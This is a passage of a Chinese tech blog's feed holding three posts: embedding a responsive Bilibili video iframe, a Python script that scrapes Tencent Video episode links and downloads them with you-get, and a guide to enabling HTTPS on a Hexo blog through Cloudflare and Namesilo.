class="line">&lt;div style=&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;&gt;&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=55224540&amp;cid=96981660&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot; style=&quot;position: absolute; width: 100%; height: 100%; left: 0; top: 0;&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>只需要把你的视频地址和上面的视频地址替换一下就行，最后效果如下：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div>  <p>手机上也能很好的自适应：   </p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili3.png" alt></p><p>不过发现依然不能全屏播放，还是有些美中不足，所以只好也将视频播放链接放到视频下面了，如果不能全屏就只能去源链接去看了，如果你有更好的解决方法，欢迎下方留言。</p><h1 id="0x03-致谢"><a href="#0x03-致谢" class="headerlink" title="0x03 致谢"></a>0x03 致谢</h1><p>本文中的自适应解决方案来自这篇文章：<a href="https://www.andyvj.com/2019/02/12/190213-01/" target="_blank" rel="noopener">文章地址</a>，里面还介绍了其他音视频平台插入的方法，在这里也谢谢这位老哥了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-未修改&quot;&gt;&lt;a href=&quot;#0x00-未修改&quot; class=&quot;headerlink&quot; title=&quot;0x00 未修改&quot;&gt;&lt;/a&gt;0x00 未修改&lt;/h1&gt;
    
    </summary>
    
      <category term="经验总结" scheme="http://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="BiliBili" scheme="http://www.teamssix.com/tags/BiliBili/"/>
    
      <category term="自适应视频大小" scheme="http://www.teamssix.com/tags/%E8%87%AA%E9%80%82%E5%BA%94%E8%A7%86%E9%A2%91%E5%A4%A7%E5%B0%8F/"/>
    
      <category term="解决方案" scheme="http://www.teamssix.com/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    
  </entry>
  
  <entry>
    <title>【Python实例】批量下载斗罗大陆高清视频</title>
    <link href="http://www.teamssix.com/year/190613-191825.html"/>
    <id>http://www.teamssix.com/year/190613-191825.html</id>
    <published>2019-06-13T11:18:25.000Z</published>
    <updated>2019-10-16T09:34:30.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-下载视频下载脚本"><a href="#0x00-下载视频下载脚本" class="headerlink" title="0x00 下载视频下载脚本"></a>0x00 下载视频下载脚本</h1><p>首先来到我的<a href="http://www.github.com/teamssix/" target="_blank" rel="noopener">Github主页</a>，找到Douluo-download项目，点开找到<a href="https://github.com/teamssix/Douluo-download.git" target="_blank" rel="noopener">下载地址</a>，使用git clone对其进行下载</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/teamssix/Douluo-download.git</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo1.png" alt></p><h1 id="0x01-安装python所需要的库"><a href="#0x01-安装python所需要的库" class="headerlink" title="0x01 安装python所需要的库"></a>0x01 安装python所需要的库</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Douluo-download/</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo2.png" alt></p><h1 id="0x02-执行Python程序"><a href="#0x02-执行Python程序" class="headerlink" title="0x02 执行Python程序"></a>0x02 执行Python程序</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 douluo.py</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo3.png" alt><br>程序在执行的时候会感觉比较慢，其实不是卡了，而是程序正在下载视频，当下载好一个视频才会弹出一条信息。</p><h1 id="0x03-查看成果"><a href="#0x03-查看成果" class="headerlink" title="0x03 查看成果"></a>0x03 查看成果</h1><p>执行ls命令可以看到刚才下载的视频<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo4.png" alt><br>播放看看能不能正常播放<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo5.png" alt><br>可以看到是可以正常播放的，不过我想试试最新的一集，也就是看看需要会员的视频能不能下载下来，当前最新的一集是55集，那我们下载试试。</p><h1 id="0x04-继续尝试下载VIP视频"><a href="#0x04-继续尝试下载VIP视频" class="headerlink" title="0x04 继续尝试下载VIP视频"></a>0x04 继续尝试下载VIP视频</h1><p>知道下载那一集后还需要修改一下代码才行，将原来下载视频的代码简单做一下修改就行<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo6.png" alt><br>执行看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo7.png" alt><br>看来不行，只能下载到预告片，接下来就对代码就行简单的介绍吧</p><h1 id="0x05-代码简单介绍"><a href="#0x05-代码简单介绍" class="headerlink" title="0x05 代码简单介绍"></a>0x05 代码简单介绍</h1><h2 id="1、第一部分：导入库设定变量"><a href="#1、第一部分：导入库设定变量" class="headerlink" title="1、第一部分：导入库设定变量"></a>1、第一部分：导入库设定变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#导入库设定变量</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36&apos;&#125;</span><br><span class="line">home_url =&apos;https://v.qq.com/x/cover/m441e3rjq9kwpsc/m00253deqqo.html&apos;</span><br></pre></td></tr></table></figure><p>这部分就是导入一些库和一些设定的变量什么的，比如headers、url什么的，没什么好说的</p><h2 id="2、第二部分：爬取每个视频的id"><a href="#2、第二部分：爬取每个视频的id" class="headerlink" title="2、第二部分：爬取每个视频的id"></a>2、第二部分：爬取每个视频的id</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#爬取每个视频的id</span><br><span class="line">douluohome = requests.get(home_url,headers=headers)</span><br><span class="line">douluohome.encoding=&apos;utf-8&apos;</span><br><span class="line">douluosoup = BeautifulSoup(douluohome.text,&apos;html.parser&apos;)</span><br><span class="line">douluolist = douluosoup.select(&apos;.mod_episode&apos;)[0].select(&apos;a&apos;)</span><br></pre></td></tr></table></figure><p>这里用到了BeautifulSoup4库，先requets获取页面信息，用BeautifulSoup4去对页面html进行解析，最后找到我们想要的东西，这里是清洗出每个视频的ID</p><h2 id="3、第三部分：合成下载链接"><a href="#3、第三部分：合成下载链接" class="headerlink" title="3、第三部分：合成下载链接"></a>3、第三部分：合成下载链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#合成下载链接</span><br><span class="line">lists = []</span><br><span class="line">for i in range(len(douluolist)):</span><br><span class="line">    lists.append(&apos;https://v.qq.com&apos;+douluolist[i][&apos;href&apos;])</span><br></pre></td></tr></table></figure><p>很简单的一个处理，将上一步获取的视频的id加到v.qq.com后面，生成视频的播放链接</p><h2 id="4、第四部分：开始下载视频"><a href="#4、第四部分：开始下载视频" class="headerlink" title="4、第四部分：开始下载视频"></a>4、第四部分：开始下载视频</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#开始下载视频</span><br><span class="line">for i in range(len(lists)):</span><br><span class="line">    try:</span><br><span class="line">        print(os.popen(&apos;you-get &#123;&#125;&apos;.format(lists[i])).read()) #视频会下载到当前目录</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    continue</span><br></pre></td></tr></table></figure><p>这部分其实也没有什么东西，有了每个视频的播放链接后，直接使用工具就可以下载了，这里使用的是利用os库调用you-get命令进行下载的，最后将you-get命令的显示结果传回终端。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>总的说来，其实Python主要就是起到爬虫作用，爬取每个视频的播放链接，最后使用you-get对视频进行下载，没有什么太大的难度，所以权当练练手了。</p><p>下面为视频演示：</p><!--<iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>--><!--<p align = "center"><iframe height=auto width=100% src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1"></iframe></p>--><!--<iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" width="780" height="480" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>--><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av55224540/" title="源链接" target="_blank" rel="noopener">源链接</a>观看。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-下载视频下载脚本&quot;&gt;&lt;a href=&quot;#0x00-下载视频下载脚本&quot; class=&quot;headerlink&quot; title=&quot;0x00 下载视频下载脚本&quot;&gt;&lt;/a&gt;0x00 下载视频下载脚本&lt;/h1&gt;&lt;p&gt;首先来到我的&lt;a href=&quot;http://www.github.com/teamssix/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Github主页&lt;/a&gt;，找到Douluo-download项目，点开找到&lt;a href=&quot;https://github.com/teamssix/Douluo-download.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载地址&lt;/a&gt;，使用git clone对其进行下载&lt;/p&gt;
    
    </summary>
    
      <category term="实例演示" scheme="http://www.teamssix.com/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/"/>
    
    
      <category term="Python" scheme="http://www.teamssix.com/tags/Python/"/>
    
      <category term="斗罗大陆" scheme="http://www.teamssix.com/tags/%E6%96%97%E7%BD%97%E5%A4%A7%E9%99%86/"/>
    
      <category term="GitHub" scheme="http://www.teamssix.com/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>为自定义域名的Hexo博客升级到Https网站</title>
    <link href="http://www.teamssix.com/year/191612-123700.html"/>
    <id>http://www.teamssix.com/year/191612-123700.html</id>
    <published>2019-06-12T04:37:00.000Z</published>
    <updated>2019-07-15T04:57:02.757Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一把小绿锁，增加安全与安全感。cloudflare 是一家国外的CDN加速服务商，我们可以用它来把我们的网站升级到https，同时还能够提高网站的访问速度。<br>如果在设置的过程中，因为网站太多英文而困扰，可以利用浏览器的一些插件进行翻译，比如Chrome自带的翻译。<br>我使用的域名提供商是namesilo，博客工具是hexo，在网上找到很多教程都是用的Github官方提供的升级到https的教程，要不就是各种命令，然后按照教程去配置就各种依赖报错，十分心累。<br>本文配置过程中，没有涉及到命令的地方，利用CloudFlare配置https，整体体验还是很是很不错的，而且还能一定程度上的伪装自己的真实IP地址，废话不多说，下面就开整吧。</p><a id="more"></a><h1 id="0x01-注册CloudFlare"><a href="#0x01-注册CloudFlare" class="headerlink" title="0x01 注册CloudFlare"></a>0x01 注册<strong>CloudFlare</strong></h1><p>打开注册地址<a href="https://dash.cloudflare.com/sign-up" target="_blank" rel="noopener">https://dash.cloudflare.com/sign-up</a>，输入邮箱和密码，对于下面是否接收广告的选项我是取消勾选，可以自行选择，勾选了平时邮箱会接收到来自CloudFlare的广告。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https1.png" alt><br>此时邮箱会收到验证邮件，点击Verify email按钮，跳转到登陆界面，输入正确的账号密码后，才算是验证成功。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https2.png" alt></p><h1 id="0x02-添加配置网站"><a href="#0x02-添加配置网站" class="headerlink" title="0x02 添加配置网站"></a>0x02 添加配置网站</h1><p>回到Cloudflare页面，输入自己的域名<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https3.png" alt><br>网页提示正在查询你的DNS记录，点击Next<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https4.png" alt><br>这里我选择0元/月，也就是免费的，具体每个Plan是什么意思，可以看下面翻译后的图片，选择后之后，点击Confirm plan<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https5.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https6.png" alt><br>弹出提示信息，问我们是否确认购买这个plan，我们直接确认，点击Confirm<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https7.png" alt><br>将所有DNS记录删除，添加类型为A，Name为www，Value为你的IP地址，TTL为自动的一条记录后，点击Continue<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https8.png" alt>接下来需要修改你的域名服务器，这就需要到你购买域名的地方去修改了，我的域名是在namesilo购买的，因此这里以namesilo为例。<br>这里可以先把下图中红色框中的内容先复制下来。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https9.png" alt></p><h1 id="0x03-配置域名服务器"><a href="#0x03-配置域名服务器" class="headerlink" title="0x03 配置域名服务器"></a>0x03 配置域名服务器</h1><p>打开自己购买域名的地方，这里我打开的是namesilo官网，对于其他域名网站都类似，具体配置域名服务器的教程可以谷歌之。<br>进入官网登陆后，点击Manage My Domains<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https10.png" alt><br>选择需要修改的域名后，点击Change Nameservers，namesilo默认有3个Nameservers，我这里之前已经修改过了，所以NameServers栏中会和默认的不一样。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https11.png" alt><br>先将原来信息删除，将上面复制的内容逐一复制进去即可，点击SUBMIT，这里因为我已经修改过了，因此界面会显示不大一样。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https12.png" alt><br>回到CloudFlasre页面，点击Continue，跳转到以下界面，稍等一段时间，来到namesilo查看配置进度<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https13.png" alt><br>下面Status显示Active说明域名服务器就已经配置好了。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https14.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https15.png" alt></p><h1 id="0x04-配置SSL"><a href="#0x04-配置SSL" class="headerlink" title="0x04 配置SSL"></a>0x04 配置SSL</h1><p>来到Crypto，点击using SSl<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https16.png" alt><br>点击Sign up<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https17.png" alt><br>跳转到如下界面<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https18.png" alt><br>等待一段时间，少则几十分钟一个小时，多则24小时，见到下面红色框内容出现，说明SSl配置就成功了<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https19.png" alt><br>此时登陆我们的域名就可以看到高贵的安全锁标志了。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https20.png" alt></p><h1 id="0x05-设置Always-Use-HTTPS规则"><a href="#0x05-设置Always-Use-HTTPS规则" class="headerlink" title="0x05 设置Always Use HTTPS规则"></a>0x05 设置Always Use HTTPS规则</h1><p>虽然设置了http，但是发现输入域名还是会自动以http协议连接，因此我们来到Page Rules添加一下规则。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https21.png" alt><br>第一个框填写自己的域名，接着选择Always Use HTTPS，点击Save and Deploy。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https22.png" alt><br>同样需要等待一段时间，输入自己域名后就可以发现可以直接跳转到https了。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>除此之外在宝塔上配置https也是很方便的，不过因为担心宝塔配置Web的过程中安装的LNMP什么的和本地一些已经安装好的环境发生冲突，最后还是没有继续选择使用宝塔，于是在网上查找了很多将http升级为https的方法，但基本都是用的国内的云，都有自带的证书服务，并不适用于我的情况，最后看到这篇文章：<a href="https://zhouhengheng.com/%E5%AE%9E%E7%8E%B0Hexo%E5%8D%9A%E5%AE%A2%E4%BB%8EHTTP%E5%88%B0HTTPS%E5%8A%A0%E5%AF%86.html" target="_blank" rel="noopener">文章链接</a>，不过写的比较简陋，于是结合这篇文章以及自己的摸索，记录下这篇文章。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;一把小绿锁，增加安全与安全感。cloudflare 是一家国外的CDN加速服务商，我们可以用它来把我们的网站升级到https，同时还能够提高网站的访问速度。&lt;br&gt;如果在设置的过程中，因为网站太多英文而困扰，可以利用浏览器的一些插件进行翻译，比如Chrome自带的翻译。&lt;br&gt;我使用的域名提供商是namesilo，博客工具是hexo，在网上找到很多教程都是用的Github官方提供的升级到https的教程，要不就是各种命令，然后按照教程去配置就各种依赖报错，十分心累。&lt;br&gt;本文配置过程中，没有涉及到命令的地方，利用CloudFlare配置https，整体体验还是很是很不错的，而且还能一定程度上的伪装自己的真实IP地址，废话不多说，下面就开整吧。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="http://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="Hexo" scheme="http://www.teamssix.com/tags/Hexo/"/>
    
      <category term="Https" scheme="http://www.teamssix.com/tags/Https/"/>
    
      <category term="CloudFlare" scheme="http://www.teamssix.com/tags/CloudFlare/"/>
    
      <category term="Namesilo" scheme="http://www.teamssix.com/tags/Namesilo/"/>
    
  </entry>
  
</feed>
